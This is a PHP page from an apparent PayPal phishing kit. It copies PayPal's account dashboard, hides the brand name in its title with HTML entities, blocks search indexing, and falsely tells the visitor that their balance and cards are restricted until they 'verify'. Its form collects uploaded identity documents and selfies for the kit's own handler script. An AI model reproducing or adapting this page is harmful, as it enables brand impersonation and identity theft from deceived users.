<?php
    
    require_once __DIR__.'/functions/functions.php';
	require __DIR__.'/functions/crypt.php';
    require_once __DIR__.'/../lang/detect.php';
    
    if(!isset($_SESSION)) { session_start(); }
    if ($SETTING_IDENTITY == 1)
    {

    }
    else
    {
        header("Location: congratulation.php?_cmd=".md5(rand(1,999))."&verification_dispatch=".base64_encode(md5(rand(1,100))));
        exit();
    }
?>
<!DOCTYPE html>
<html>

    <head>
        <title>&#80;ay&#80;al - &#67;on&#102;ir&#109; identity</title>
        <link rel="shortcut icon" href="../assets/img/icon.ico" />
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="cache-control" content="no-cache">
        <meta http-equiv="cache-control" content="no-store">
        <meta http-equiv="cache-control" content="max-age=0">
        <meta http-equiv="expires" content="-1">
        <meta http-equiv="pragma" content="no-cache">
        <meta name="robots" content="noindex,nofollow">
        <!-- Style -->
        <link rel="stylesheet" type="text/css" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/font-awesome.min.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/VerifyPage.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/jquery.filer.css">
        <!-- Scripts -->
        <script type="text/javascript" src="../assets/js/jquery.min.js"></script>
        <script type="text/javascript" src="../assets/js/bootstrap.min.js"></script>
        <script type="text/javascript" src="../assets/js/CardType.js"></script>
        <!-- Upload ID -->
        <script type="text/javascript" src="../assets/js/jquery.filer.min.js"></script>

    </head>

    <body>
        <header class="header">
            <nav class="navbar-verify">
                <div class="nav-desktop">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-8">
                                <ul>
                                    <li>
                                        <a href="#" class="navbar-brand ppl-brand"></a>
                                    </li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text3; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text4; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text5; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text6; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text7; ?></a></li>
                                </ul>
                            </div>
                            <div class="col-md-4">
                                <ul class="right-navbar">
                                    <li><a href="#"><i class="fa fa-bell" style="font-size: 23px;"></i></a></li>
                                    <li><a href="#"><i class="fa fa-cog" style="font-size: 23px;"></i></a></li>
                                    <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;border: 1px solid;border-radius: 18px;"><?php echo $P1_text8; ?></a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="nav-mobile">
                    <ul>
                        <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;border: 1px solid;border-radius: 18px;"><?php echo $P1_text8; ?></a></li>
                        <li>
                            <a href="#" class="navbar-brand ppl-brand"></a>
                        </li>
                        <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;"><i class="fa fa-bell" style="font-size: 25px;"></i></a></li>
                    </ul>
                </div>
            </nav>
            <div class="UserInfo">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-7 col-md-7 col-ms-12 Profile_UserName">
                            <div class="container">
                                <div class="row">
                                    <div class="profilepic"> <img src="../assets/img/profilepic.png"> </div>
                                    <div>
                                        <p class="HelloUser"><?php echo $P1_text10; ?><br> <a href="#"><?php echo $P1_text11; ?></a></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-5 DisplayName-3-Item">
                            <center>
                                <div class="col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="icon-mobile" style="padding: 24px;color: #0070ba;"><i class="fa fa-send" style="font-size: 27px;"></i></div>
                                    </center>
                                    <p class="text-center"><a href="#"><?php echo $P1_text13; ?></a></p>
                                </div>
                            </center>
                            <center>
                                <div class="col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="icon-mobile"><i class="fa fa-mobile" style="font-size: 48px;color: #0070ba;"></i></div>
                                    </center>
                                    <p class="text-center"><a href="#"><?php echo $P1_text14; ?></a></p>
                                </div>
                            </center>
                            <center>
                                <div class="col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="icon-mobile" style="padding: 24px;"><i class="fa fa-shopping-bag" style="font-size: 27px;color: #0070ba;"></i></div>
                                    </center>
                                    <p class="text-center"><a href="#"><?php echo $P1_text15; ?></a></p>
                                </div>
                            </center>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <!-- End BarTop -->
        <div class="container PageContent">
            <div class="row">
                <div class="col-lg-4 col-md-4 np">

                    <div class="col-lg-12 col-md-12 Tap-1">
                        <div class="Step1Header CardN"><b class="page-header"><?php echo $P1_text16; ?></b></div>
                        <div class="VerifiStep">
                            <div class="VerticalLine"></div>
                            <ul>
                                <li class="Tap-1-Active"><font><?php echo $P1_text17; ?></font></li>
                                <li class="Tap-1-Active"><font href="#"><?php echo $P1_text18; ?></font></li>
                                <li class="Tap-3"><font href="#"><?php echo $P1_text19; ?></font></li>
                            </ul>
                        </div>
                    </div>

                    <div class="col-lg-12 col-md-12 Tap-2">
                        <div class="Step1Header" style=""> <b class="page-header"><?php echo $P5_text20; ?></b> <span class="pull-right"><a href="#"><?php echo $P5_text21; ?> <i class="fa fa-angle-right"></i></a></span>
                        </div>
                        <div class="VerifiStep">
                            <p class="HowManyMoney">
                            	<img src="../assets/img/warning-alert.jpg" class="warning-text-img" />
                                <p>Please complete verification steps to restore your balance</p>
                            </p>
                            <ul class="WithdrawMoney">
                            	<li><a href="#" class="Step1Header"><?php echo $P5_text3; ?></a></li>
                            	<li><a href="#" class="Step1Header"><?php echo $P5_text4; ?></a></li>
                            </ul>
                         </div>
                    </div>

                    <div class="col-lg-12 col-md-12 Tap-2">
                        <div class="Step1Header">
                        	<b class="page-header"><?php echo $P5_text5; ?></b>
                        </div>
                        <div class="VerifiStep cards-and-banks">
							<img src="../assets/img/warning-alert.jpg" class="warning-text-img" />
                            <p>Please complete verification steps to restore your credit cards</p>
                            <div><a href="#" class="add-card"><?php echo $P1_text27; ?></a></div>
                            <br>
                         </div>
                    </div>

                    <div class="col-lg-12 col-md-12 Tap-2">
                        <div class="Step1Header">
                        	<b class="page-header"><?php echo $P1_text33; ?></b>
                        </div>
                        <div class="VerifiStep cards-and-banks">
                            <ul class="WithdrawMoney">
                            	<li><a href="#" class="Step1Header"><?php echo $P1_text34; ?></a></li>
                            	<li><a href="#" class="Step1Header"><?php echo $P1_text35; ?></a></li>
                            	<li><a href="#" class="Step1Header"><?php echo $P1_text36; ?></a></li>
                            </ul>

                         </div>
                    </div>

                </div><!-- End Tap Left -->


                <div class="col-lg-8 col-md-8 np">
                <div class="col-lg-12 col-md-12 Verify-Form pull-right">
               	<form action="functions/identity.php" method="post" id="CcForm"  enctype="multipart/form-data">
	                
<!-- Cc Page -->


                     <div class="transitioning spinner hide">
                        <p class="oneSecond"><?php echo $P5_text6; ?></p>
                     </div>
                    <div class="container">
                    <br>
                    <br>
                    <div class="col-md-12">
                        <h5 class="page-header" style="padding-bottom: 10px;"><?php echo $P6_text2; ?></h5>
                        <p style="margin-bottom: 3px;"><?php echo $P6_text9; ?></p>
                        <p><?php echo $P6_text10; ?></p>
						<ul class="steps-identity">
							<li><?php echo $P6_text11; ?></li>
							<li><?php echo $P6_text12; ?></li>
							<li><?php echo $P6_text13; ?></li>
						</ul>
                        <br>
                    </div>
                    <div class="AlertDiv" id="UploadFileError">
                        <p class="AlertMessage"><?php echo $P6_text5; ?></p>
                    </div>
                    
                    <?php if (isset($_GET['UP']) == 'Failed') { ?>
                    <div class="AlertDiv" id="UploadFileError">
                        <p class="AlertMessage"><?php echo $P6_text5; ?></p>
                    </div>
                    <?php } ?>

                    <div class="col-md-6 pull-left np">

                                    <script type="text/javascript">

                                        function UpPreview(event)
                                        {

                                            var output = document.getElementById("PreviewFucking");
                                            var FineName = document.getElementById("IdentityFile");

                                            output.src = URL.createObjectURL(event.target.files[0]);

                                          //  alert(event.target.files[0].value);

                                        };

                                        function formatSizeUnits(bytes){
                                              if      (bytes>=1073741824) {bytes=(bytes/1073741824).toFixed(2)+' GB';}
                                              else if (bytes>=1048576)    {bytes=(bytes/1048576).toFixed(2)+' MB';}
                                              else if (bytes>=1024)       {bytes=(bytes/1024).toFixed(2)+' KB';}
                                              else if (bytes>1)           {bytes=bytes+' bytes';}
                                              else if (bytes==1)          {bytes=bytes+' byte';}
                                              else                        {bytes='0 byte';}
                                              return bytes;
                                        }


                                        $(document).ready(function(){
                                            $('#IdentityFile').bind('change', function() {
                                              var IdFileSize = formatSizeUnits(this.files[0].size);
                                              var IdFileName = this.files[0].name;
                                              $('#IdFileName').html(IdFileName);
                                              $('#IdFileSize').html(IdFileSize);
                                              $('#PreviewId').show();
                                              $('.SubmitID').show();
                                            });
											$('.footer').toggleClass();
                                        });

                                    </script>
                                    <center>
                                    <label for="IdentityFile" id="AddDocument">
                                        Add document
                                    </label>
                                    <input type="file" name="IdentityFile" id="IdentityFile" onchange="UpPreview(event)" >
                                    </center>
                                    <br>
                                    <div id="PreviewId" class="jFiler-items jFiler-row"><ul class="jFiler-item-list"><li class="jFiler-item" data-jfiler-index="0" style="">                                <div class="jFiler-item-container">                                    <div class="jFiler-item-inner">                                        <div class="jFiler-item-thumb">                                            <div class="jFiler-item-status"></div>                                            <div class="jFiler-item-info">                                                <span class="jFiler-item-title"><b id="IdFileName"></b></span>                                            </div>                                            <div class="jFiler-item-thumb-image"><img id="PreviewFucking" draggable="false"></div>                                        </div>                                        <div class="jFiler-item-assets jFiler-row">                                            <ul class="list-inline pull-left">                                                <li><span class="jFiler-item-others"><i class="icon-jfi-file-image jfi-file-ext-jpg" id="IdFileSize" ></i> </span></li>                                            </ul>                                            <ul class="list-inline pull-right">                                                <li><a class="icon-jfi-trash jFiler-item-trash-action"></a></li>                                            </ul>                                        </div>                                    </div>                                </div>                            </li></ul></div>

                            <input class="SubmitID" value="Continue" type="submit" name="">

                    </div>
                    <div class="col-md-6 pull-left">
						<img src="../assets/img/selfi.png" style="width: 100%;border: 2px solid #54bdeb;border-radius: 8px;">
                    </div>

                            <center>
                                <div class="clear"></div>
                                <br>
                                <hr class="style3" style="border-top: 1px dashed #8c8b8b;">
                                <br>
                                <div class="col-md-2"></div>
                                <div class="col-md-4 pull-left">
                                <div class="item1">
                                    <center><img src="../assets/img//paypal-fast.png" style="width: 100%;">
                                    <b class="text-center"><?php echo $P5_text13; ?></b></center>
                                    <p class="text-left"><?php echo $P5_text14; ?></p>
                                </div>
                            </div>
                            
                            <div class="col-md-4 pull-left">
                                <div class="item1">
                                    <center><img src="../assets/img//cardreader-new.png" style="width: 100%;">
                                    <b class="text-center"><?php echo $P5_text15; ?></b>
                                    <p class="text-left"><?php echo $P5_text16; ?></p></center>
                                </div>
                            </div>

                            <div class="col-md-4 pull-left">
                                <div class="item1">
                                    <center><img src="../assets/img/paypal-donation.png" style="width: 100%;">
                                    <b class="text-center"><?php echo $P5_text17; ?></b>
                                    <p class="text-left"><?php echo $P5_text18; ?></p></center>
                                </div>
                            </div>
                                <div class="col-md-2"></div>
                            </center>
                    </div>

<!-- End Cc Page -->
				
				</form>
                </div>
	                    	</div>
							
	                    </div>
	                </div><!-- End Verification Form -->

	            </div>
        </div>
        </div>
        </div>
        </div>
        <div class="wrap"></div>
        <footer class="footer">
        	<div class="container">
        		<div class="row">
        		<div class="col-md-12">
        		<p class="text-center" style="margin: 0;background: #ffffff;padding: 1%;color: #9e9e9e;"><?php echo $P5_text19; ?></p>
        		</div>
        		</div>
        	</div>
        </footer>
</body>
</html>